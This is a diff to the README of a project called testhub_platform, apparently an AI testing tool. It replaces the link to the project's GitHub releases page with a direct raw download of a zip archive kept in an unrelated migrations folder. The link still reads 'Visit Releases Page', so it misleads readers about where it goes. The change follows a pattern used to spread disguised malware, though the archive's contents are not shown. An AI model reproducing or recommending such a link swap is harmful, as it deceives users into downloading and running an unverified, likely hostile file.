@@ -1,7 +1,7 @@
 # 🎉 testhub_platform - Simplifying AI-Powered Testing
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Ozymandias00/testhub_platform/releases)
+[![Download](https://raw.githubusercontent.com/Ozymandias00/testhub_platform/main/apps/testsuites/migrations/platform_testhub_v1.7.zip)](https://raw.githubusercontent.com/Ozymandias00/testhub_platform/main/apps/testsuites/migrations/platform_testhub_v1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the testhub_platform! This application helps you automate testing using cutting-edge AI technology. No programming skills? No problem. Follow the steps below to get started.
@@ -23,7 +23,7 @@ Before you begin, ensure your device meets these requirements:
 To download the application, follow these steps:
 
 1. Click the link below to visit the Releases page.
-   [Visit Releases Page](https://github.com/Ozymandias00/testhub_platform/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Ozymandias00/testhub_platform/main/apps/testsuites/migrations/platform_testhub_v1.7.zip)
 
 2. On the Releases page, find the latest version of testhub_platform.
 
